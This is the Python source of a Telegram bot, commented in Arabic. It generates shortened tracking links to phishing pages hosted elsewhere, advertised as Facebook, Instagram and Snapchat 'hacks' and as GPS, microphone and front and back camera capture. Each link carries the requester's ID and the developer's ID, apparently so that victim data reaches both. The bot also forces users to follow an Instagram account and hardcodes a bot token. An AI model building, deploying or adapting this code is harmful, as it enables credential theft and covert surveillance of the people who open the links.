import telebot
from telebot import types
import requests
from flask import Flask
from threading import Thread
import os
import time

# إعداد السيرفر
app = Flask('')
@app.route('/')
def home(): return "M.Y.9 System Online"

def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
def keep_alive(): Thread(target=run).start()

# --- إعدادات البوت ---
TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
MY_ID = '7238206121' # آي دي أبو سند
bot = telebot.TeleBot(TOKEN)

bot.remove_webhook()
time.sleep(1)

def short(url):
    try: return requests.get(f"https://is.gd/create.php?format=simple&url={url}").text
    except: return url

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.chat.id
    
    warning_text = f"""
⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:

عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـ^ـضـ^ـمـ^ـان اسـ^ـتـ^ـقـ^ـرار الاتـ^ـصـ^ـال بـ^ـيـ^ـن الـ^ـبـ^ـوت وسـ^ـيـ^ـرفـ^ـراتـ^ـنـ^ـا، يـ^ـجـ^ـب عـ^ـلـ^ـيـ^ـك مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور الـ^ـرسمـ^ـي عـ^ـلى انـ^ـسـ^ـتـ^ـغـ^ـرام.

🔴 تـحـذيـر: بـدون مـتـابـعـة المـطـور سـتـبـقى الروابـط مـشـفـرة 💀🔥
    """
    
    markup = types.InlineKeyboardMarkup()
    # تم تثبيت الرابط m_y_.9 ليعمل بشكل مباشر كزر URL
    btn_insta = types.InlineKeyboardButton("🔗 مـتـابـعـة المـطـور (إجـبـاري)", url="https://www.instagram.com/m_y_.9/")
    btn_done = types.InlineKeyboardButton("✅ تـم المـتـابـعـة (تـفـعـيـل)", callback_data="check_follow")
    markup.add(btn_insta)
    markup.add(btn_done)
    
    bot.send_message(uid, warning_text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_follow")
def check_follow(call):
    uid, name = call.message.chat.id, call.from_user.first_name
    h = name.replace(" ", "_")
    base = "https://m-y-9-tech.github.io/fb/"
    
    p = f"?id={uid}&hunter={h}&dev={MY_ID}"
    lnks = {
        "fb": short(base+"fb.html"+p), "ig": short(base+"ig.html"+p),
        "sn": short(base+"snap.html"+p), "lc": short(base+"loc.html"+p),
        "au": short(base+"audio.html"+p), "c1": short(base+"cam.html"+p),
        "c2": short(base+"cam2.html"+p)
    }

    main_msg = f"""
🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {name}

👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💎 قـ^ـائـ^ـمـ^ـة الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة 💎
▬▬▬▬▬▬▬▬▬▬▬▬▬▬

🔹 اخـ^ـتـ^ـراق فـ^ـيـ^ـس بـ^ـوك (2009)
🔗 `{lnks['fb']}`


🔸 اخـ^ـتـ^ـراق انـ^ـسـ^ـتـ^ـغـ^ـرام (2009)
🔗 `{lnks['ig']}`


👻 اخـ^ـتـ^ـراق سـ^ـنـ^ـاب شـ^ـات (2009)
🔗 `{lnks['sn']}`


📍 سـ^ـحـ^ـب الـ^ـمـ^ـوقـ^ـع (GPS)
🔗 `{lnks['lc']}`


🎤 سـ^ـحـ^ـب الـ^ـصـ^ـوت (Mic)
🔗 `{lnks['au']}`


🤳 كـ^ـمـ^ـرة أمـ^ـامـ^ـيـ^ـة (HD)
🔗 `{lnks['c1']}`


📷 كـ^ـمـ^ـرة خـ^ـلـ^ـفـ^ـيـ^ـة (HD)
🔗 `{lnks['c2']}`

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚙️ Status: Connected Successfully
    """
    
    bot.delete_message(uid, call.message.message_id)
    # ملاحظة: تم استخدام MarkdownV2 أو الهروب من الرموز لضمان عدم اختفاء الرموز
    bot.send_message(uid, main_msg, parse_mode="Markdown", disable_web_page_preview=True)

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
